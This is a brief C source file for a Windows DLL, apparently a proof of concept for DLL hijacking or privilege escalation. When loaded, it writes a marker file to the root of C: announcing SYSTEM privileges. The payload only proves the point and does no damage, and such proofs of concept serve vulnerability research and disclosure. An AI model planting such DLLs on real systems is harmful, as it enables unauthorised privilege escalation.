
#include <windows.h>
#include <stdio.h>

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
    if (fdwReason == DLL_PROCESS_ATTACH) {
        FILE *file = fopen("C:\\poc_only_admin_can_write_to_c.txt", "w");
        if (file) {
            fputs("Exploit succeeded! You have SYSTEM privileges.\n", file);
            fclose(file);
        }
    }
    return TRUE;
}
